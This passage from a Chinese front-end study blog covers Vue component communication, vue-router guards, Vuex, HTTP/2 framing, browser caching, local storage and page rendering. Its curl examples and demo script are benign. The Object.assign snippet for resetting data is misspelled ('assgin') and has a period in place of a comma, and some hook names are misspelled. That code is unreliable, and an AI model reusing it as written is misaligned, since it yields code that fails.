mathvariant="normal">取</mi><mi mathvariant="normal">缔</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">但</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">children 方法取缔了。但是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">缔</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">但</span><span class="mord cjk_fallback">是</span></span></span></span>parent api方法还在。</p><p>这种方法非常适合父子组件。父组件在调用子组件的标签那里设置一个ref，然后就可以通过<code>this.$refs.child.</code>来访问到子组件的所有属性和方法了。</p><p>子组件则可以通过 <code>this.$parent.</code>来访问到父组件中所有的属性和方法。</p><p>可以说是父子组件传值的首选方法，因为它直观又简单。</p><p>在线链接：<a href="https://wuuconix.github.io/static/refs-parent/">https://wuuconix.github.io/static/refs-parent/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/refs-parent/src">https://github.com/wuuconix/static/tree/main/refs-parent/src</a></p></blockquote></li><li><p>vuex</p><blockquote><p>vuex是vue官方出的用来解决大型网页应用中组件之间传值的插件。</p><p>它的功能是将某些组件之间需要公用的属性放在一个store里面，实现方便的公用，并且能够保证响应式。父组件把这个store里面的属性改变了，子组件的页面会进行刷新。</p><p>而且由于它和eventBus，api是全局的，我们可以在 任何组件，包括跨代的祖先-后代组件和兄弟组件中都可以方便的使用。</p><p>它唯一的缺点是它需要npm安装包，对于小型网页来说可能有些小题大做了。</p><p>在线链接：<a href="https://wuuconix.github.io/static/vuex/">https://wuuconix.github.io/static/vuex/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/vuex/src">https://github.com/wuuconix/static/tree/main/vuex/src</a></p></blockquote></li></ol><h2 id="11-vue-中怎么重置-data"><a class="markdownIt-Anchor" href="#11-vue-中怎么重置-data"></a> 11. vue 中怎么重置 data?</h2><p>利用<code>this.$options.data(this)</code>可以得到原始的data数据。</p><p>然后我们可能会想直接 <code>this.$data = this.$options.data(this)</code> 来充值data，但是这样实测是不行的，可能由于直接把$data换成另外一个对象后，模板里面的数据可能还是绑定的之前的data，所以页面不会发生变化。好在我们可以用<code>Object.assign</code>把原本的data的值覆盖掉现在data的值。由于data整个对象没有变化，只是里面的值发生了变化，所以可以实现页面响应的效果。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assgin</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">$data</span>. <span class="hljs-variable language_">this</span>.<span class="hljs-property">$options</span>.<span class="hljs-title function_">data</span>(<span class="hljs-variable language_">this</span>))<br></code></pre></td></tr></table></figure><p>同样我写了一个小页面来学习并实践。</p><p>在线链接：<a href="https://wuuconix.github.io/static/data-reset/">https://wuuconix.github.io/static/data-reset/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/data-reset/src">https://github.com/wuuconix/static/tree/main/data-reset/src</a></p><h2 id="12-组件中写-name-选项有什么作用"><a class="markdownIt-Anchor" href="#12-组件中写-name-选项有什么作用"></a> 12. 组件中写 name 选项有什么作用？</h2><ol><li><p>项目使用keep-alive时，可以搭配组件name进行缓存过滤</p></li><li><p>递归调用组件需要通过name来调用自身</p></li><li><p>name的值会在vue-devtools中展示出来，如果不设置的话，默认是vue文件的名字。</p><blockquote><p>在不使用cli方式的情况下，没有单个vue组件了，vue-devtools中看到的可能就是<code>&lt;AnonymousComponent&gt;</code>了</p><p><a href="https://v3.cn.vuejs.org/api/options-misc.html#name">官方说明</a></p></blockquote></li></ol><h2 id="13-vue-router-有哪些钩子函数"><a class="markdownIt-Anchor" href="#13-vue-router-有哪些钩子函数"></a> 13. vue-router 有哪些钩子函数?</h2><p>全局的守卫有3个，路由规则独享的守卫有1个，组件内的守卫有3个</p><ol><li><p>全局前置守卫 this.$router.beforeEach</p></li><li><p>全局解释守卫 this.$router.beforeResolve</p></li><li><p>全局后置守卫 this.$router.afterEach</p></li><li><p>路由独享的守卫 beforeEnter</p></li><li><p>组件内的守卫 beforeRouteEnter  beforeRouterUpdate beforeRouteLeave</p></li></ol><p>写了一个有趣的页面用来学习各种路由守卫。</p><p>在线链接：<a href="https://wuuconix.github.io/static/vue-router/">https://wuuconix.github.io/static/vue-router/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/vue-router/src">https://github.com/wuuconix/static/tree/main/vue-router/src</a></p><h2 id="14-route-和-router-的区别是什么"><a class="markdownIt-Anchor" href="#14-route-和-router-的区别是什么"></a> 14. route 和 router 的区别是什么？</h2><p><code>this.$router</code> 就是全局路由实例对象，我们之前说的钩子函数中的，beforeEach, beforeResolve, afterEach都是它的方法。</p><p>而<code>this.$route</code> 就是一个路由信息对象，和我们那些守卫中的 <code>to, from</code> 的对象是同一种对象，只不过我们可以直接调用<code>this.$route</code>来得到当前的路由信息。</p><blockquote><p>路由信息对象中包括 fullPath path query hash 等属性。</p></blockquote><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml">&#123;<span class="hljs-attr">path:</span> <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">name:</span> <span class="hljs-string">undefined</span>, <span class="hljs-attr">params:</span> &#123;<span class="hljs-string">…</span>&#125;, <span class="hljs-attr">query:</span> &#123;<span class="hljs-string">…</span>&#125;, <span class="hljs-attr">hash:</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">…</span>&#125;<br><span class="hljs-attr">fullPath:</span> <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-attr">hash:</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-attr">matched:</span> []<br><span class="hljs-attr">meta:</span> &#123;&#125;<br><span class="hljs-attr">name:</span> <span class="hljs-string">undefined</span><br><span class="hljs-attr">params:</span> &#123;&#125;<br><span class="hljs-attr">path:</span> <span class="hljs-string">&quot;/&quot;</span><br><span class="hljs-attr">query:</span> &#123;&#125;<br><span class="hljs-attr">redirectedFrom:</span> <span class="hljs-string">undefined</span><br>[[<span class="hljs-string">Prototype</span>]]<span class="hljs-string">:</span> <span class="hljs-string">Object</span><br></code></pre></td></tr></table></figure><h2 id="17-vuex-有哪几种属性"><a class="markdownIt-Anchor" href="#17-vuex-有哪几种属性"></a> 17. Vuex 有哪几种属性?</h2><p>有五种，分别是 State Getter Mutation Action Module</p><h2 id="20-v-show和v-if指令的共同点和不同点"><a class="markdownIt-Anchor" href="#20-v-show和v-if指令的共同点和不同点"></a> 20. v-show和v-if指令的共同点和不同点</h2><ol><li><p>v-show是通过css的display:none 让其显示或者隐藏</p></li><li><p>v-if 是通过直接销毁和重建DOM达到元素隐藏和显示的效果。</p></li></ol><h1 id="http"><a class="markdownIt-Anchor" href="#http"></a> HTTP</h1><h2 id="22-http2-有哪些改进"><a class="markdownIt-Anchor" href="#22-http2-有哪些改进"></a> 22. HTTP/2 有哪些改进？</h2><p>首先我们来看以下http/1.1 和 http/2的区别吧。</p><div style="display:flex; justify-content:center; align-items:center; width: 100%">    <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; width: 100%">        <iframe src="" id="http11" marginheight="0" frameborder="0" scrolling="no" width="100%" height="5px"></iframe>        <button onclick="load1()">加载http/1.1</button>    </div>    <div style="display:flex; flex-direction:column; justify-content:center; align-items:center; width: 100%;">        <iframe src="" id="http2" marginheight="0" frameborder="0" scrolling="no" width="100%" height="5px">        </iframe>        <button onclick="load2()">加载http/2</button>    </div></div><script>    let ifram1 = document.querySelector("#http11")    let ifram2 = document.querySelector("#http2")    let load1 = () => {        ifram1.src = "https://http1.akamai.com/demo/h1_demo_frame.html"        ifram1.height = "500px"    }    let load2 = () => {        ifram2.src = "https://http2.akamai.com/demo/h2_demo_frame.html"        ifram2.height = "500px"    }</script><p>这个速度差异是惊人的，值得注意的是，这个地球图片实际上是由许多许多小图片构成的，所以我们可以说在大量小文件的情况下，http/2相比http/1.1 有着令人震惊的提升。</p><p>它提高性能的提升主要有两点。</p><ol><li><p>头部压缩</p><p>在http/1.1时期，只有请求体能够被压缩，但是有些情况下请求头因为复杂的请求字段也会变得非常大，http/2 就利用了HPACK算法对请求头进行压缩。</p><p>HPACK有以下两个亮点。</p><p>服务器和客户端之间会建立一个哈希表，存放一些常用的字段，服务器和客户端交互的时候不发字段，而只发这个字段在在哈希表中对应的索引，这实现了字段的极大压缩。</p><blockquote><p>这里的字段可以包含任何字符，比如你可以把<code>GET</code>放到哈希表中，也可以把<code>index.html</code>放到哈希表中。</p></blockquote><p>HPACK会对数字和字符串进行哈夫曼编码。</p></li><li><p>多路复用</p><p>HTTP/2 利用流在同一个TCP连接上来进行多个数据帧的通信。<br />在HTTP/1.1 时代，有一个很大的问题就是HTTP队头阻塞。HTTP的前一个请求如果还没有得到响应，后面的请求就会被阻塞住。</p><blockquote><p>要区别HTTP队头阻塞和TCP队头阻塞，前者的层次是在<strong>HTTP 请求-响应</strong>层面，而后者是<strong>数据报</strong>层面。</p></blockquote><p>我们可以使用并发连接试图解决这个问题，但这只是增加了TCP链接来均摊风险，每一条链接内部仍然存在HTTP队头阻塞，所以可以说并发连接这个方案没有从根本上解决HTTP队头阻塞这个问题，只是一个缓和方案。</p><p>HTTP/2 的解决方案是二进制分帧。通过把请求和响应划分为更小的帧，在服务器看来不再是一个个完整的报文，而是一堆乱序的二进制帧，这些二进制帧不需要排队等待，直接一股脑发送即可，所以解决了HTTP队头阻塞的问题。</p><p>很显然，客户端向服务端发送请求的二进制帧，服务器向客户端发送响应的二进制帧，这种二进制帧的双向传输的序列，也叫做<strong>流</strong>。</p><p>HTTP/2 用流 在同一个TCP连接上来进行多个数据帧的通信，这就是<strong>多路复用</strong>的的概念</p></li></ol><p>此外HTTP/2 还设置了一些新功能。</p><ol><li><p>设置请求优先级</p><blockquote><p>二进制帧中Priority帧作为一种控制帧可以实现设置优先级的功能。</p></blockquote></li><li><p>服务器推送</p><blockquote><p>服务器不再是完全被动的接收请求，它也能主动给客户端发送消息。比如客户端请求了一个html文件，服务器可以在返回html的基础上，把这个html引用到的其他文件比如js文件和css文件一起返回给客户端，减少客户端的等待。</p></blockquote></li></ol><h2 id="23-http2-中的二进制帧是如何设计的"><a class="markdownIt-Anchor" href="#23-http2-中的二进制帧是如何设计的"></a> 23. HTTP/2 中的二进制帧是如何设计的？</h2><p>这个问题可以从帧结构、流的状态变化、流的特性三个角度来回答。</p><p><strong>帧结构</strong></p><p>HTTP/2的 二级制的 帧结构如下图。</p><p><img src="https://upload-images.jianshu.io/upload_images/20317748-b766e35310416fd2.png" alt="帧结构" /></p><p>每个帧可以分为帧头和帧体。</p><p>帧头中一共有9个字节。前3个字节代表帧的长度【帧体的长度】。</p><p>第四个字节代表帧类型，大体分为数据帧Data 和 其他的控制帧。</p><blockquote><p>这里介绍两个比较有用的控制帧。Header帧用来打开第一个流。Priority帧可以用来实现设置请求优先级。</p><p>对各种帧的介绍请参考 <a href="https://halfrost.com/http2-http-frames-definitions/#toc-1">HTTP/2 中的帧定义</a></p></blockquote><p>第五个字节是帧标志，共有8个标志位。比较常用的有<code>END_HEADERS</code>表示头数据的结束，<code>END_STREAM</code>表示单方面数据发送结束。</p><p>后四个字节是<code>Stream ID</code>，即流标识符，利用这个标识符，接收方就能从乱序的二进制帧中选择出相同ID的帧，按顺序组装成请求/响应报文。</p><p><strong>流的状态变化</strong></p><p>之前讲过，流是双向传输的二进制序列。而流的状态是会发生的改变的，比如流什么时候开始传输，什么时候结束。</p><p>HTTP/2借鉴了TCP状态转化的思想，借用帧的标志位来实现具体的改变。</p><p>一个普通的响应-请求的过程如下图。</p><p><img src="https://upload-images.jianshu.io/upload_images/20317748-e596e78f2d6c5cd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/447/format/webp" alt="响应-请求" /></p><p>首先客户端发送一个Headers帧，提醒服务端 流的传输即将开始，开始后就是双方进行双向传输 数据帧 / 控制帧。</p><p>如果客户端觉得信息获取的差不多了，打算关闭流，客户端就向服务端发送<code>END_STREAM</code>帧【更准确说是有END_STREAM标志位的帧】，这个时候客户端就处于半关闭状态了，只能接受，不能发送。</p><p>服务端接受到<code>END_STREAM</code>帧后，立刻处于半关闭状态，只能发送，不能接受，随后服务端也向客户端发送一个<code>END_STREAM</code>，服务器的流完全关闭。</p><p>客户端接受到服务器发送的<code>END_STREAM</code>帧后，流也完全关闭，这时两者都处于了关闭状态。</p><p><strong>流的特性</strong></p><ol><li><p>并发性</p><p>同一个HTTP/2连接上可以同时收发多个帧，这也是实现多路复用的基础。</p></li><li><p>自增性</p><p>流ID不可重用，而是顺序递增，当达到上限后会新开TCP连接从头开始。</p></li><li><p>双向性</p><p>客户端和服务端都可以创建流，互不干扰，双方都可以作为发送方和接收方。</p></li><li><p>可设置优先级</p><p>可以设置数据帧的优先级，让服务器优先处理重要资源，优化用户体验。</p></li></ol><h1 id="浏览器"><a class="markdownIt-Anchor" href="#浏览器"></a> 浏览器</h1><h2 id="1-能不能说一说浏览器缓存"><a class="markdownIt-Anchor" href="#1-能不能说一说浏览器缓存"></a> 1. 能不能说一说浏览器缓存?</h2><p>浏览器缓存可以分为<strong>强缓存</strong>和<strong>协商缓存</strong></p><p>它们的区别是是否需要发送http请求。强缓存是不需要发送http请求的。</p><p>我们先来说<strong>强缓存</strong>。</p><p>服务器在响应头中的<code>Expires</code>和<code>Cache-Control</code>字段可以用来控制强缓存的时间。</p><p>我们拿一个实例举例子，你可以在终端里输入一下命令。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">curl -v https://cdn.wuuconix.link/<span class="hljs-variable">%E5</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%BE</span><span class="hljs-variable">%E5</span><span class="hljs-variable">%BA</span><span class="hljs-variable">%8</span>A/<span class="hljs-number">95635319</span>_p<span class="hljs-number">0</span>.png\?download\<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>我们可以在服务器的响应中看到两个字段。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">expires</span>: Sun, <span class="hljs-number">01</span> May <span class="hljs-number">2022</span> <span class="hljs-number">14</span>:<span class="hljs-number">58</span>:<span class="hljs-number">19</span> GMT<br><span class="hljs-attribute">cache</span>-control: max-age=<span class="hljs-number">14400</span><br></code></pre></td></tr></table></figure><p>第一个expires表示这个内容的过期时间是在在2022年5月1号14:58分。</p><p>第二个cache-control表示这个内容可以在 14400秒内 直接使用。</p><p>看上去Expires描述的内容更加直观，写明了内容将会在什么时候过期，浏览器在这之前都可以直接强缓存，不需要重新请求。但是Expires有个很坑的地点，就是服务器的时间和客户端的时间可能是不同的。</p><blockquote><p>实际上我在写这个内容的时候已经是2022年5月1号19:00了，如果按照expires的值，这个图片早就过期了，但是它仍然好好的，这是因为服务器的时间是GMT，而我的时间是GMT+8。所以这个图片真实的过期时间是我这里的 2022年5月1号22:58分</p></blockquote><p>Expires由于存在明显缺陷，在HTTP/1.1中提出了<code>Cache-Control</code>这个字段，它没有指明具体的过期时间，而是用<code>max-age</code>给了一个图片可以有效的存活时间，这样就算服务器和浏览器的时区不同，浏览器仍然知道它应该在4个小时后过期此缓存。</p><blockquote><p>Expires按理说应该被淘汰了，它是HTTP/1.0提出的，但是如你看到的，很多服务器还会去使用它，好在如果这个服务器同时有Expires和Cache-Control的情况下，Cache-Control会被优先考虑。这也是为什么这张图片没有过期的原因。</p></blockquote><p>Cache-Control字段中不光可以写<code>max-age</code>来指明图片的有效存活时间，还有以下的值。</p><ol><li><p>private</p><p>表示只有浏览器能够缓存，中间的代理服务器不能缓存</p></li><li><p>no-cache</p><p>跳过当前的强缓存，发送HTTP请求，直接进入 协商缓存阶段</p></li><li><p>no-store</p><p>直接不进行任何缓存，不强缓存也不协商缓存</p></li><li><p>s-maxage</p><p>它和max-age类似，但是是针对代理服务器的缓存。</p></li></ol><p>再来说<strong>协商缓存</strong></p><p>协商缓存实际上发生在强缓存失效时候。</p><p>http头部中和协商缓存两个相关的字段是<code>Last-Modified</code>和<code>Etag</code>。</p><p>比如你使用以下命令可以查看 我的博客地址返回的响应。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -v https:<span class="hljs-regexp">//</span>wuuconix.link<br></code></pre></td></tr></table></figure><p>你可以在响应中发现这两个字段</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">last</span>-modified: Sat, <span class="hljs-number">30</span> Apr <span class="hljs-number">2022</span> <span class="hljs-number">04</span>:<span class="hljs-number">18</span>:<span class="hljs-number">59</span> GMT<br><span class="hljs-attribute">etag</span>: <span class="hljs-string">&quot;626cb8b3-8104&quot;</span><br></code></pre></td></tr></table></figure><p>而且你会发现响应中没有<code>Expires</code>也没有<code>Cache-Control</code>字段，说明我的博客页面是不使用强缓存的。</p><p>这可是由于博客文章可能会随时变化，我们无法断定在未来某个时间段之前博客页面不会变化而让浏览器强缓存了。</p><p>但是出于节省服务器流量的考虑，我的博客页面支持协商缓存。</p><p>如果服务器一开始的响应字段有<code>Etag</code>，那么浏览器就会在 协商缓存请求 的时候加上<code>If-None-Match: Etag-value</code>。</p><p>如果服务器一开始的响应字段有<code>Last-Modified</code>，那么浏览器就会在 协商缓存请求 的时候加上<code>If-Modified-Since: Last-Modified-value</code>。</p><p>服务器得到后会进行判断，查看内容是否发生了更改，如果没有发生更改，则返回 304状态码【响应体为空】表示让浏览器继续用之前的缓存吧，内容没变！如果服务器判断后发现内容改变了，则会返回200状态码，响应体则为新的内容，而且也会更新的<code>Last-Modified</code>和<code>Etag</code>的值。</p><p>Etag和Last-Modified各有优点。</p><p>Etag是对文件内容的哈希，内容一变，Etag就会变，十分准确， 但是消耗性能。</p><p>Last-Modified是服务器去看文件什么时候被编辑过了，这个时间可能不够准确【比如1秒中内修改多次服务器无法识别】。而且如果只是touch这个文件而没有实际修改内容，也会更新Last-Modified的值，这实际上不需要，因为内容没变，但是Last-Modified识别的不是文件内容，而是文件编辑时间。当然了，它的优点就是性能优异，服务器不需要进行哈希运算。</p><p>如果服务器同时返回了Etag和Last-Modified，服务器决策时会首先根据<code>Etag</code>来决策。</p><p><img src="https://pic4.zhimg.com/80/v2-852fb8bb33b2757054a048701e8c9f07_720w.jpg" alt="强缓存-协商缓存机制" /></p><p>浏览器存放缓存的位置有四个。按照优先级分别是</p><ol><li><p>Service Worker Cache</p></li><li><p>Memory Cache</p></li><li><p>Disk Cache</p></li><li><p>Push Cache</p></li></ol><p>比较常见的就是内存缓存和磁盘缓存了，一般来说较小的文件会进入内存，较大的文件会进入磁盘缓存。</p><p>最后我又写了一个小页面来学习Cache-Control。</p><p>在线链接：<a href="https://wuuconix.github.io/static/cache-control/">https://wuuconix.github.io/static/cache-control/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/cache-control/src">https://github.com/wuuconix/static/tree/main/cache-control/src</a></p><h2 id="2-能不能说一说浏览器的本地存储各自优劣如何"><a class="markdownIt-Anchor" href="#2-能不能说一说浏览器的本地存储各自优劣如何"></a> 2. 能不能说一说浏览器的本地存储？各自优劣如何？</h2><p>浏览器的本地存储主要分为<code>Cookie</code>,<code>Web Storage</code>和<code>IndexedDB</code>。其中Web Storage又分为<code>localStorage</code>和<code>sessionStorage</code>。</p><ol><li><p>Cookie</p><p>Cookie一开始设计实际上不是为了做本地存储的，而是为了弥补HTTP在状态管理方面的不足。</p><p>HTTP协议是一个无状态协议，客户端向服务端发送请求，服务端响应，就ok了。那如何让服务器根据不同的客户端发送具有特点的响应呢？这个背景下就产生了Cookie，服务器端会解析客户端请求携带的cookie，得到客户端所处的状态，从而返回具有不同的响应。</p><p>然而Cookie存在很多缺陷。</p><ul><li><p>容量缺陷。Cookie的体积上限是4KB</p></li><li><p>性能缺陷。Cookie和一个域名绑定在一起，访问这个域名下的任意路由都会在请求中携带Cookie而不管这个路由到底需不需要Cookie。当请求数较多时，对性能是非常浪费的。</p><blockquote><p>值得注意的是，如果是域名下的一个具体的文件。比如 <a href="https://yun.139.com/w/static/js/jquery.min-1.11.1.js">https://yun.139.com/w/static/js/jquery.min-1.11.1.js</a> 则不会包含cookie。</p></blockquote></li><li><p>安全缺陷。Cookie以纯文本的形式在浏览器和服务器之间传递，很容易被黑客截获。</p></li></ul></li><li><p>localStorage</p><p>localStorage有一点和Cookie一样，就是一个域名下面对应一个localStorage。</p><p>但是它相比cookie有以下好处。</p><ul><li><p>容量。localStorage的容量上限为5MB。相比4KB的Cookie大了许多。</p></li><li><p>只存在于客户端，默认不参与客户端和服务端的通信，这样就很好避免了Cookie带来的性能问题和安全问题。</p></li><li><p>接口封装。利用localStroage.setItem 和 localStorage.getItem等方法可以方便的进行操作。</p>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;wuuconix&quot;</span>, <span class="hljs-string">&quot;yyds&quot;</span>)<br><span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">&quot;wuuconix&quot;</span>) <span class="hljs-comment">//yyds</span><br></code></pre></td></tr></table></figure></li></ul><p>localStorage适合存储一些内容稳定的资源。</p></li><li><p>sessionStorage</p><p>sessionStorage和localStorage几乎一致。它们唯一的区别是前者为会话级别的存储。而后者是持久存储。会话结束，即页面关闭后，sessionStorage就没了。</p><blockquote><p>页面的刷新不会导致sessionStorage消失（包括硬刷新）。只有关闭页面后sessionStotage才会消失。而且同域名，不同页面下由于是不同的会话，它们的sessionStorage不共享。所以sessionStorage的存储只限当前页面，页面一关就会消失。</p></blockquote><p>由于sessinStorage刷新后不消失，我们可以用来将表单信息保存在其中，在用户不小心刷新页面后仍然能够恢复。</p></li><li><p>IndexedDB</p><p>它是运行在浏览器上的非关系型数据库。理论上容量无上限。</p><p>IndexedDB除了数据库本身的特性，比如支持事务、存储二进制数据等。它还有一些特性。</p><ul><li><p>键值对存储。</p></li><li><p>异步操作。</p></li><li><p>受同源策略限制，无法访问跨域的数据库。</p></li></ul><p>它唯一的缺点可能就是操作太复杂了。根据mdn的推荐，我们可以使用<a href="https://localforage.github.io/localForage/">localForage</a>这个indexDB封装库来用简单的api使用indexDB，降低编程难度。</p><p>最后我写了一个页面来尝试在IndexDB中存储20张图片。</p><blockquote><p>第一次访问网站需要等待20个图片的fetch。</p><p>之后进入网站就是直接从IndexDB里面取图片了。</p></blockquote><p>在线链接：<a href="https://wuuconix.github.io/static/IndexDB/">https://wuuconix.github.io/static/IndexDB/</a></p><p>页面源码：<a href="https://github.com/wuuconix/static/tree/main/IndexDB/src">https://github.com/wuuconix/static/tree/main/IndexDB/src</a></p></li></ol><h2 id="3-说一说从输入url到页面呈现发生了什么网络"><a class="markdownIt-Anchor" href="#3-说一说从输入url到页面呈现发生了什么网络"></a> 3. 说一说从输入URL到页面呈现发生了什么？（网络）</h2><ol><li><p>浏览器构建请求</p><p>实际上就是HTTP报文中的起始行。包括 请求方法 路径 HTTP协议版本</p> <figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">GET /%E5%9B%BE%E5%BA%8A/<span class="hljs-keyword">image</span><span class="hljs-number">-20220320212359433.</span>png?download=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure></li><li><p>查找强缓存</p><p>如果命中，不需要发送HTTP请求，直接使用浏览器中的强缓存。如果没有命中则进入下一步。</p></li><li><p>DNS解析</p><p>查看浏览器中有没有该域名的DNS解析缓存，如果有，则直接根据缓存结果得到该域名的ip，如果没有缓存，则请求DNS服务器得到该域名的ip。</p></li><li><p>建立TCP连接。</p><p>需要三次握手建立起客户端和服务器之间的连接。</p></li><li><p>发送HTTP请求</p><p>当TCP连接建立完毕，浏览器就可以向服务器发送HTTP请求。HTTP请求包括请求行【即第一步里建立的起始行】、请求头，如果是POST请求的话还会有请求体。</p></li><li><p>服务器HTTP响应</p><p>响应报文中包含相应行、响应头和响应体。</p><p>响应行由 HTTP协议版本 状态码 和 状态描述组成。</p> <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">302</span> Moved Temporarily<br></code></pre></td></tr></table></figure><p>响应结束后TCP连接不一定结束，需要看HTTP请求头或者响应头中是否包含<code>Connection: Keep-Alive</code>，如果有，则表示建立了持久连接，之后的HTTP请求都会复用这个TCP连接。</p><p>如果是<code>Connection: Close</code>，请求响应流程结束，需要关闭TCP连接。</p><p>TCP需要4次挥手，从而关闭TCP连接。</p></li></ol><p>最后附上一张图。</p><p><img src="https://images2.pianshen.com/287/01/01f294a1610d366e389aa4e568f64ac7.png" alt="浏览器端的网络请求过程" /></p><h2 id="4-说一说从输入url到页面呈现发生了什么解析算法"><a class="markdownIt-Anchor" href="#4-说一说从输入url到页面呈现发生了什么解析算法"></a> 4. 说一说从输入URL到页面呈现发生了什么？（解析算法）</h2><p>在完成了网络请求和响应后，如果响应头的<code>Content-Type</code>为<code>text/html</code>，那么接下来就是浏览器的解析和渲染工作。</p><p>解析主要分为</p><ol><li><p>构造DOM树</p><p>由于浏览器无法理解HTML字符串，所以需要解析为DOM树。</p><p>解析算法主要包括了标记化算法和建树算法。</p></li><li><p>样式计算</p><ul><li><p>格式化样式表。我们可以用<code>document.styleSheets</code> 查看结果。</p></li><li><p>标准化样式属性。比如说把red变成#ff0000等。</p></li><li><p>计算每个节点的具体样式。规则是继承和层叠。最终某个节点的样式结果我们可以用<code>window.getComputedStyle(document.querySelector(&quot;#subtitle&quot;))</code>来得到。</p></li></ul></li><li><p>生成 布局树 <code>Layout Tree</code></p><p>在有了DOM树和DOM样式，现在我们就需要确定各个元素的位置，也就是生成一颗布局树。</p><p>布局树的大致工作如下：</p><ul><li><p>遍历DOM树的节点，把它放到布局树中</p></li><li><p>计算布局树的节点的坐标位置</p></li></ul><p>值得注意的是布局树中仅包含可见元素，比如head标签和设置了<code>display: none</code>的元素，将不会放入其中。所以<code>display: none</code>的元素在DOM树里，但是最终不会出现在布局树中，所以最后它将不占页面的位置【甚至你用浏览器开发者工具的元素审计你只能看到它在DOM中，但是鼠标移动它上面，页面上不会有任何显示，因为它不存在于布局树中】</p></li></ol><p><img src="https://pic.imgdb.cn/item/62709910239250f7c5fcdf77.jpg" alt="总结" /></p><h2 id="5-说一说从输入url到页面呈现发生了什么渲染过程"><a class="markdownIt-Anchor" href="#5-说一说从输入url到页面呈现发生了什么渲染过程"></a> 5. 说一说从输入URL到页面呈现发生了什么？（渲染过程）</h2><p><strong>绘制图层树</strong></p><p>在<a href="#4-说一说从输入url到页面呈现发生了什么解析算法" class="tocbot-link node-name--H2 ">4. 说一说从输入URL到页面呈现发生了什么？（解析算法）</a>我们已经得到了布局树，看起来貌似我们已经能够直接开始绘制了，但是实际上还不行，因为css中有一个属性<code>z-index</code>将导致层叠上下文的出现。</p><blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Positioning/Understanding_z_index/The_stacking_context">MDN层叠上下文</a></p></blockquote><p>这些层叠上下文将可能导致元素之间被遮盖等很多问题。所以我们还需要生成一颗 图层树 <code>Layer Tree</code>来对布局树中的特定节点进行分层。</p><p>节点的图层默认属于父节点的图层【这些图层被称为合成层】，但是有两种情况会导致被提升作为一个单独的合成层。</p><p>第一种情况是<strong>显式合成</strong>。</p><ul><li><p>拥有层叠上下文的节点会触发显式合成，至于如何拥有层叠上下文，参照<a 